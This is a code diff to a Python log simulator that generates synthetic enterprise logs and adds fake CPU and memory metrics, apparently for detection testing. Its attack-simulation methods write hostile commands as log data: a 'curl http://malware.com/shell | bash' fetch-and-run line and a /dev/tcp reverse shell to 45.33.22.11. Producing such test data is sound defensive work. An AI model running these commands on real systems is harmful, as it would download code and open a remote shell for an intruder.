@@ -147,6 +147,41 @@ class EnterpriseLogGenerator:
         outcome_str = "success" if str(status).startswith("2") else "failure"
         self.write("api", log, intent=intent, outcome=outcome_str, trace_id=trace_id)
 
+    def gen_metric(self, host, metric_name, value, tags=None):
+        ts = datetime.now().isoformat()
+        metric_doc = {
+            "timestamp": ts,
+            "host": host,
+            "metric_name": metric_name,
+            "value": value,
+            "tags": tags or { "collector": "simulated"}
+        }
+        metric_path = os.path.join(BASE_DIR, "system", "metrics.log")
+        os.makedirs(os.path.dirname(metric_path), exist_ok=True)
+
+        with open(metric_path, "a") as f:
+            f.write(json.dumps(metric_doc) + "\n")
+
+    def simulate_metric_spike(self, host, duration_steps=5):
+        """Generates several high-value metric points to simulate a resource spike."""
+        for _ in range(duration_steps):
+            self.gen_metric(host, "cpu_usage", random.uniform(85.0, 99.0), tags={"status": "anomaly"})
+            self.gen_metric(host, "mem_usage", random.uniform(80.0, 95.0), tags={"status": "anomaly"})
+            time.sleep(0.1)
+
+    def background_all_metrics(self):
+        for host in self.hosts:
+            # CPU: Small fluctuations around a low base
+            cpu = random.uniform(2.0, 12.0)
+            mem = random.uniform(35.0, 45.0)
+            disk = random.uniform(100.0, 800.0)
+            net = random.uniform(5.0, 50.0)
+
+            self.gen_metric(host, "cpu_usage_pct", cpu)
+            self.gen_metric(host, "mem_usage_pct", mem)
+            self.gen_metric(host, "disk_io_kbs", disk)
+            self.gen_metric(host, "network_io_kbs", net)
+
     def normal_traffic(self):
         funcs = [self.gen_4002_http, self.gen_4001_network, self.gen_1006_scheduled_job, 
                  self.gen_1007_process_activity, self.gen_6003_api, self.gen_3002_auth]
@@ -154,7 +189,12 @@ class EnterpriseLogGenerator:
 
     def attack_pattern_persistence(self, attacker_ip="45.33.22.11"):
         print(f"💀 Simulating Persistence Attack from {attacker_ip}...")
+
+        target_host = random.choice(self.hosts)
+        print(f"Persistence attack on {target_host} from {attacker_ip}")
+
         self.gen_4002_http(ip=attacker_ip, path="/cgi-bin/vulnerable.sh", status="200", intent="exploitation")
+        self.simulate_metric_spike(target_host)
         time.sleep(0.5)
         self.gen_1007_process_activity(proc_name="curl http://malware.com/shell | bash", intent="execution")
         time.sleep(0.5)
@@ -163,6 +203,9 @@ class EnterpriseLogGenerator:
         self.gen_1006_scheduled_job(cmd="/bin/bash -i >& /dev/tcp/45.33.22.11/443 0>&1", user="backdoor_user", intent="persistence")
 
     def attack_pattern_webapp(self, target_ip =None):
+        target_host = random.choice(self.hosts)
+        self.gen_metric(target_host, "cpu_usage", random.uniform(40.0, 60.0), tags={"status": "suspicious"})
+
         target_ip = target_ip or random.choice(self.internal_ips)
         attacker_ip = f"192.168.1.{random.randint(2,254)}"
         print(f"💉 Injecting Web Attacks against {target_ip}...")
@@ -195,6 +238,9 @@ if __name__ == "__main__":
     print(f"🚀 High-Variation Multi-File Simulator started.")
     try:
         while True:
+
+            gen.background_all_metrics()
+
             for _ in range(random.randint(10, 30)):
                 gen.normal_traffic()
                 if random.random() > 0.98: gen.gen_3001_account_change()
